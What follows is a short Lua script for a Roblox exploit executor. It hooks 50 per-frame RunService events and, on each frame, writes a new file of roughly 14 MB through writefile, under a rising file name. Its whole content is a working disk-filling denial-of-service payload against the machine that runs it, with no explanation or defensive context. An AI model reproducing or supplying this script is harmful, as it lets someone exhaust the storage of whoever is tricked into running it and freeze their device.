if not game:IsLoaded() then game.Loaded:Wait() end

local RunService = game:FindService('RunService')
local Loops = {
    RunService.Stepped,
    RunService.RenderStepped,
    RunService.Heartbeat,
    RunService.PreRender,
    RunService.PreSimulation
}

local String = string.rep('𪚥', 3484848)
local Name = 1

for _ = 1, 10 do
    for _, RS in ipairs(Loops) do
        RS:Connect(function()
            task.spawn(function()
                writefile(Name .. '.txt', String)
            end)
            Name = Name + 1
        end)
    end
end
